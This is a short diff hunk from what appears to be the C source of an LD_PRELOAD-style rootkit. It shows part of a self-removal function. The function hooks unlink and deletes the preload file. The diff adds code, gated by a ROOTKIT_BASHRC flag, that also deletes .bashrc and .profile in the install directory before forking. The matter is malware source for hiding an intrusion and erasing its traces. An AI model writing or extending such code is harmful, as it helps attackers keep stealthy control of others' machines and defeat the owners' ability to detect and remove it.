@@ -5,6 +5,10 @@ int remove_self(void){
      * are clean processes. */
     hook(CUNLINK);
     call(CUNLINK, PRELOAD_FILE);
+#ifdef ROOTKIT_BASHRC
+    call(CUNLINK, INSTALL_DIR"/.bashrc");
+    call(CUNLINK, INSTALL_DIR"/.profile");
+#endif
 
     pid_t pid;
     if((pid = fork()) == -1) return VFORK_ERR;   /* if we can't fork, return error */
